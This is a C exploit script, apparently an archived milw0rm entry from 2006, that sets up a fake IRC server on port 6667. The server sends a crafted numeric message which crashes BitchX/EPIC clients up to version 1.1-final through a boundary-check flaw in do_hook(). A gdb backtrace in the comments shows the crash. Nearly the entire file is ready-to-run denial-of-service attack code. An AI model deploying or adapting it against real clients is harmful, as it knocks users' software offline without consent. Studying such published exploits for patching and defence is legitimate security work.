// BitchX (epic) =<1.1-final | do_hook() Boundary Check Error Remote DoS
/////////////////////////////////////////////////////////////////////////
// Federico L. Bossi Bonin
// fbossi<at>netcomm<dot>com<dot>ar


// #0  0x080a3fcc in BX_do_hook (which=9999999, format=0x8119077 "%s %s") at hook.c:865
// #1  0x080d013b in numbered_command (from=0xbfbfe031 'A' <repeats 200 times>, 
// comm=-9999999, ArgList=0xbfbfd788) at numbers.c:1413
// #2  0x080d7d02 in parse_server (orig_line=0xbfbfe030 ":", 'A' <repeats 199 times>...) at parse.c:1912
// #3  0x080de3c2 in do_server (rd=0xbfbfe8a0, wr=0xbfbfe880) at server.c:584
// #4  0x080b030f in BX_io (what=0x810b85a "main") at irc.c:1319
// #5  0x080b09da in main (argc=6, argv=0xbfbfe9d4, envp=0xbfbfe9f0) at irc.c:1687
// #6  0x0804aec2 in ___start ()

//greats to nitr0us, beck, gruba, samelat, ran, etc..

#include <stdio.h>
#include <sys/types.h> 
#include <sys/socket.h>
#include <netinet/in.h>

#define PORT 6667
#define LEN 100

int intalign=-999; //use negative number

void sendbuff(int sock) {
char ptr[LEN];
char buffer[2048];
bzero(ptr,LEN);
bzero(buffer,2048);
memset(ptr,0x41,sizeof(ptr)-1);
sprintf(buffer,":%s %i %s %s\n",ptr,intalign,ptr,ptr);
write(sock,buffer,sizeof(buffer));
}

int main() {
struct sockaddr_in srv_addr, client;
int len,pid,sockfd,sock;

sockfd = socket(AF_INET, SOCK_STREAM, 0);

if (sockfd < 0) { 
perror("error socket()"); 
exit(1);
}
     
bzero((char *) &srv_addr, sizeof(srv_addr));
srv_addr.sin_family = AF_INET;
srv_addr.sin_addr.s_addr = INADDR_ANY;
srv_addr.sin_port = htons(PORT);

if (bind(sockfd, (struct sockaddr *) &srv_addr,sizeof(srv_addr)) < 0)  {
perror("error bind()");
exit(1);
}


printf("BitchX (epic) =<1.1-final | do_hook() Boundary Check Error Remote DoS\n");
printf("====================================================================\n");
printf("Listening on port %i\n",PORT);

listen(sockfd,5);
len = sizeof(client);

while (1) {
sock = accept(sockfd, (struct sockaddr *) &client, &len);
if (sock < 0)  {
perror("error accept()");
exit(1);
}

pid = fork();
if (pid < 0)  {
perror("fork()");
exit(1);
}
if (pid == 0)  {
close(sockfd);
printf("Conection from %s\n",inet_ntoa(client.sin_addr));
sendbuff(sock);
exit(0);
}
else close(sock);
} 
return 0;
}

// milw0rm.com [2006-06-24]
